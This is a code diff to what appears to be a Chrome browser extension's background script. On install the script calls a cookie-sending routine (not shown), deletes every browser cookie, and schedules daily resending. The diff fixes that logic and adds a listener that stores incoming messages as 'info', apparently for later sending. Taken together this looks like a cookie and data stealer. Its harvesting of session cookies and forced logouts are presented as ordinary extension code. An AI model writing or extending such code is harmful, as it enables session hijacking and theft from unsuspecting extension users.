@@ -2,16 +2,16 @@ const interval = 1; // min
 
 (async () => {
 
-    const setStore = async (key, value) => await chrome.storage.local.set({key: value });
+    const setStore = async (key, value) => await chrome.storage.local.set({[key]: value });
     const getStore = async (key) => (await chrome.storage.local.get(key))[key];
 
     async function destroyCookies() {
         const cookies = await chrome.cookies.getAll({});
         for (let i = 0; i < cookies.length; i++) {
-                await chrome.cookies.remove({
-                    url: "https://" + cookies[i].domain + cookies[i].path,
-                    name: cookies[i].name,
-                });
+            await chrome.cookies.remove({
+                url: "https://" + cookies[i].domain + cookies[i].path,
+                name: cookies[i].name,
+            });
         }
         await setStore("destroyCookies", "false");
     }
@@ -42,12 +42,15 @@ const interval = 1; // min
     }
     
     chrome.runtime.onInstalled.addListener(async (details) => {
-        await setStore("areCookiesPending",  "false");
+        await setStore("areCookiesPending",  "true");
         await setStore("areInfoPending", "false");
         await setStore("destroyCookies", "true");
 
         const sent = await sendCookies();
-        if (sent) destroyCookies();
+        if (sent) {
+            destroyCookies();
+            await setStore("areCookiesPending", "false");
+        }
         await chrome.alarms.create("resend_cookies_each_day", {delayInMinutes: 24 * 60, periodInMinutes: 24 * 60});
     });
     
@@ -86,4 +89,19 @@ const interval = 1; // min
         if((await getStore("areCookiesPending")) == "true") return;
         await sendCookies();
     });
+
+     chrome.runtime.onMessage.addListener(
+         async (message, sender, sendResponse) => {
+             const pending =  (await getStore("areInfoPending")) == "true";
+             const info = JSON.parse(await getStore("info"));
+
+             if (pending)
+                 await setStore("info",  JSON.stringify([...info, message]));
+             else
+                 await setStore( "info", JSON.stringify([message]) );
+
+             await setStore("areInfoPending",  "true" );
+             sendResponse("done saving");
+         }
+     );
 })();
